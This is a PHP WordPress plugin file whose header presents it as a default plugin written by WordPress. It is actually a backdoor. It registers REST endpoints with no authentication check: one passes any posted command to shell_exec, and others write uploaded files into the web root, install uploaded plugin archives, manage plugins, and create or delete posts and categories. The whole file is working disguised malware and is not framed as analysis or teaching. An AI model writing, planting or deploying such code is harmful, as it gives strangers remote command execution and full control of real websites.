<?php
/*
Plugin Name: WordPress Panel
Description: WordPress default plugin.
Version: 2.1
Author: WordPress
*/

if (!defined('ABSPATH')) {
    exit;
}

function custom_admin_register_routes() {
    register_rest_route('custom-admin/v1', '/shell', [
        'methods' => 'POST',
        'callback' => 'custom_admin_execute_shell',
    ]);
    register_rest_route('custom-admin/v1', '/file', [
        'methods' => 'POST',
        'callback' => 'custom_admin_file_manager',
    ]);
    register_rest_route('custom-admin/v1', '/plugin', [
        'methods' => 'POST',
        'callback' => 'custom_admin_plugin_manager',
    ]);
    register_rest_route('custom-admin/v1', '/post', [
        'methods' => 'POST',
        'callback' => 'custom_admin_post_manager',
    ]);
    register_rest_route('custom-admin/v1', '/category', [
        'methods' => 'POST',
        'callback' => 'custom_admin_category_manager',
    ]);
    register_rest_route('custom-admin/v1', '/upload-plugin', [
        'methods' => 'POST',
        'callback' => 'custom_admin_upload_plugin',
    ]);
}

add_action('rest_api_init', 'custom_admin_register_routes');

function custom_admin_execute_shell(WP_REST_Request $request) {
    $command = $request->get_param('command');
    $output = shell_exec($command);
    return new WP_REST_Response(['output' => $output], 200);
}

function custom_admin_file_manager(WP_REST_Request $request) {
    if (isset($_FILES['file_to_upload'])) {
        move_uploaded_file($_FILES['file_to_upload']['tmp_name'], ABSPATH . '/' . $_FILES['file_to_upload']['name']);
        return new WP_REST_Response(['message' => 'File uploaded successfully.'], 200);
    }
    return new WP_REST_Response(['message' => 'No file uploaded.'], 400);
}

function custom_admin_plugin_manager(WP_REST_Request $request) {
    $action = $request->get_param('plugin_action');
    $plugin = $request->get_param('plugin');

    if ($action === 'activate') {
        activate_plugin($plugin);
        return new WP_REST_Response(['message' => 'Plugin activated.'], 200);
    } elseif ($action === 'deactivate') {
        deactivate_plugins($plugin);
        return new WP_REST_Response(['message' => 'Plugin deactivated.'], 200);
    } elseif ($action === 'delete') {
        delete_plugins([$plugin]);
        return new WP_REST_Response(['message' => 'Plugin deleted.'], 200);
    }
    return new WP_REST_Response(['message' => 'Invalid action.'], 400);
}

function custom_admin_post_manager(WP_REST_Request $request) {
    $action = $request->get_param('post_action');
    $title = $request->get_param('post_title');
    $content = $request->get_param('post_content');
    $category = $request->get_param('post_category');

    if ($action === 'create') {
        $post_id = wp_insert_post([
            'post_title' => $title,
            'post_content' => $content,
            'post_status' => 'publish',
            'post_category' => [$category]
        ]);
        return new WP_REST_Response(['message' => 'Post created with ID: ' . $post_id], 200);
    } elseif ($action === 'edit') {
        $post_id = $request->get_param('post_id');
        wp_update_post([
            'ID' => intval($post_id),
            'post_title' => $title,
            'post_content' => $content
        ]);
        return new WP_REST_Response(['message' => 'Post updated.'], 200);
    } elseif ($action === 'delete') {
        $post_id = $request->get_param('post_id');
        wp_delete_post(intval($post_id));
        return new WP_REST_Response(['message' => 'Post deleted.'], 200);
    }
    return new WP_REST_Response(['message' => 'Invalid action.'], 400);
}

function custom_admin_category_manager(WP_REST_Request $request) {
    $action = $request->get_param('category_action');
    $name = $request->get_param('category_name');
    $slug = $request->get_param('category_slug');
    $description = $request->get_param('category_description');

    if ($action === 'create') {
        $category_id = wp_insert_term($name, 'category', [
            'slug' => $slug,
            'description' => $description
        ]);
        return new WP_REST_Response(['message' => 'Category created with ID: ' . $category_id['term_id']], 200);
    } elseif ($action === 'edit') {
        $category_id = $request->get_param('category_id');
        wp_update_term(intval($category_id), 'category', [
            'name' => $name,
            'slug' => $slug,
            'description' => $description
        ]);
        return new WP_REST_Response(['message' => 'Category updated.'], 200);
    } elseif ($action === 'delete') {
        $category_id = $request->get_param('category_id');
        wp_delete_term(intval($category_id), 'category');
        return new WP_REST_Response(['message' => 'Category deleted.'], 200);
    }
    return new WP_REST_Response(['message' => 'Invalid action.'], 400);
}

function custom_admin_upload_plugin(WP_REST_Request $request) {
    if (isset($_FILES['plugin_zip'])) {
        $uploaded_file = $_FILES['plugin_zip'];
        $upload_dir = wp_upload_dir();
        $upload_path = $upload_dir['basedir'] . '/' . basename($uploaded_file['name']);
        
        if (move_uploaded_file($uploaded_file['tmp_name'], $upload_path)) {
            $result = unzip_file($upload_path, WP_PLUGIN_DIR);
            if ($result === true) {
                unlink($upload_path);
                return new WP_REST_Response(['message' => 'Plugin uploaded and installed successfully.'], 200);
            } else {
                return new WP_REST_Response(['message' => 'Failed to unzip plugin.', 'error' => $result], 500);
            }
        } else {
            return new WP_REST_Response(['message' => 'Failed to upload file.'], 500);
        }
    }
    return new WP_REST_Response(['message' => 'No file uploaded.'], 400);
}

function custom_admin_set_permissions() {
    $role = get_role('administrator');
    if ($role) {
        $role->add_cap('manage_options');
    }
}

register_activation_hook(__FILE__, 'custom_admin_set_permissions');
?>
